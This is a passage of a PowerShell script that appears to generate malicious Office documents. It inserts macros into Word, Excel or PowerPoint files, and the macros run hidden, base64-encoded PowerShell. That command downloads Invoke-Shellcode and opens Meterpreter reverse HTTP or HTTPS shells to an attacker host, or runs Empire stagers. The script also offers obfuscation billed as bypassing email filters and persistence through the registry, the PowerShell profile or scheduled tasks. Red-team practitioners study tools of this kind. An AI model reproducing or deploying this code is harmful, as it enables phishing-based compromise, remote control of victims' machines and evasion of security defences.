Write-Host "Clean-up Script located at $env:userprofile\Desktop\SchTaskCleanup.ps1"
}


function BuildMacro{ #Builds Macro and Inserts into Doc
$subs = SubCreator
$Code = @"
$subs

$global:executefunc
"@


if ($global:DocOption -eq "Create"){
    if ($global:doctype -eq "xls"){
    CreateExcel $Code}
    elseif($global:doctype -eq "doc"){
    CreateWord $Code}
    elseif($global:doctype -eq "ppt" -or $global:doctype -eq "pps"){
    CreatePPT $Code}
}
elseif ($global:DocOption -eq "Add"){
    if ($global:doctype -eq "xls"){
    AddExcelMac $Code $global:FullName}
    elseif($global:doctype -eq "doc"){
    AddWordMac $Code $global:FullName}
    elseif($global:doctype -eq "ppt" -or $global:doctype -eq "pps"){
    AddPPTMac $Code $global:FullName}
}
elseif ($global:DocOption -eq "MacroOnly"){
    CreateOutput $Code
}
}



#Logic if payload type is Invoke-Shellcode or Custom set the variable $ExecPSString which is input into the macros
if($global:paytype -eq "shellcode"){
    #Determine payload communication channel
    Do {
    Write-Host "
--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------"
    $PayloadNum = Read-Host -prompt "Select Payload Communications Channel Number & Press Enter"
    } until ($PayloadNum -eq "1" -or $PayloadNum -eq "2")

    if($PayloadNum -eq "1"){
    $Payload = "windows/meterpreter/reverse_https"}
    elseif($PayloadNum -eq "2"){
    $Payload = "windows/meterpreter/reverse_http"}

    #Create Encoded Execution Code
    $DString = "(new-object net.webclient).downloadstring('$global:IS_Url')"
    $Execution = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; iex $DString; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force"
    $ExecBytes = [System.Text.Encoding]::Unicode.GetBytes($Execution)
    $ExecEncoded = [Convert]::ToBase64String($ExecBytes)
    $ExecPSString = "powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -enc $ExecEncoded"
    }
elseif($global:paytype -eq "custom"){
    #Determine Empire stager type (or other custom payload)
    Do {
    Write-Host "
--------Select Payload---------
1. One-Liner String (Recommended)
2. Empire Generated or Custom Macro File
------------------------------"
    $PayloadNum = Read-Host -prompt "Select Generated Payload Number & Press Enter"
    } until ($PayloadNum -eq "1" -or $PayloadNum -eq "2")
    #setting custom macro flag false until choice initialized
    $CMflag = $false
    if($PayloadNum -eq "1"){
    $ExecPSString = Read-Host "Copy and Paste One-Liner or Entire Launcher String Generated by Empire"
    }
    elseif($PayloadNum -eq "2"){ 
    $CMflag = $true
    $MacroLocation = Read-Host -prompt "Enter full disk path to macro (i.e. C:\temp\macro.txt) & Press Enter"
    [string[]]$MacroInput = Get-Content $MacroLocation
    #if you make an excel doc the AutoOpen function is changed to Auto_Open
    if($global:doctype -eq "xls")
    {
    $excelnono = "Sub AutoOpen()"
    if ($MacroInput -contains $excelnono){
    for ($i = 0; $i -le $MacroInput.Length-1; $i++) {if ($MacroInput[$i] -eq $excelnono){$MacroInput[$i] = "Sub Auto_Open()"}}
    }
    }
    $CMacro = $MacroInput -join "`n"
    Custom-Macro $CMacro
    }
    }

if ($CMflag){Break}
else{

$AOFlag = $false
$BOflag = $false
#Determine Level of Obfuscation
Do {
Write-Host "
---Select Obfuscation Level---
1. Basic Obfuscation (Will bypass basic email filters, will fail in sandbox)
2. Advanced Obfuscation (Will bypass most email filters, may fail in sandbox)
------------------------------"
$ObfNum = Read-Host -prompt "Select Attack Number & Press Enter"
} until ($ObfNum -eq "1" -or $ObfNum -eq "2")

#Set obfuscation flag
if($ObfNum -eq "1"){
    $BOflag = $true}
elseif($ObfNum -eq "2"){
    $AOFlag = $true
}


if (($global:paytype -eq "shellcode") -or ($global:paytype -eq "custom" -and $PayloadNum -eq "1")){
#Determine Attack and Persistence
Do {
Write-Host "
--------Select Attack---------
1. Payload with Logon Persistence
2. Payload with Powershell Profile Persistence (REQUIRES OFFICE TO RUN AS LOCAL ADMIN)
3. Payload with Scheduled Task Persistence
4. Payload with No Persistence
------------------------------"
$AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4")

# set persistence flags for obfuscation functions
$RegFlag = $false
$ProFlag = $false
$SchFlag = $false

if($AttackNum -eq "1"){
    $RegFlag=$true
}
elseif($AttackNum -eq "2"){
    $ProFlag = $true
}
elseif($AttackNum -eq "3"){
    $SchFlag = $true
    $global:TimeDelay = Read-Host "Enter User Idle Time before the task runs (minutes)"
    $global:TaskName = Read-Host "Enter the name you want the task to be called"
}

#Set the executefunc that will build the macros into an array and obfuscate
if ($BOFlag){
$global:executefunc = BasicObfuscator($ExecPSString)
}
elseif ($AOFlag){
$global:executefunc = AdvancedObfuscator($ExecPSString)
}

#Initiate Attack Choice
if($AttackNum -eq "1"){
    BuildMacro
    Registry-Persistence-Clean
}
elseif($AttackNum -eq "2"){
    BuildMacro
    PowerShellProfile-Persistence-Clean
}
elseif($AttackNum -eq "3"){
    BuildMacro
    SchTaskPersistence-Clean
}
elseif($AttackNum -eq "4"){
    BuildMacro
}
}
elseif($global:paytype -eq "custom" -and $PayloadNum -eq "2"){
    break
}
}